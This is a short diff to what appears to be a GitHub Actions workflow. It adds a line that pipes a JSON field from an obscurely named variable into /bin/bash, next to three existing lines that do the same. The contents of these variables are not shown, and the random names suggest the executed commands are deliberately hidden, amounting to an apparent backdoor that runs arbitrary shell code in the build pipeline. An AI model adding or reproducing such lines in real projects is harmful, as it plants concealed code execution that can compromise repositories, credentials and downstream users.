@@ -29,6 +29,7 @@ jobs:
           echo $nksl5 | jq -r .pyhvi16 | /bin/bash
           echo $cdh14525 | jq -r .uc20008 | /bin/bash
           printf '%s' "$pnr44" | jq -r .nl7514 | /bin/bash
+          echo $ug941 | jq -r .fu3 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
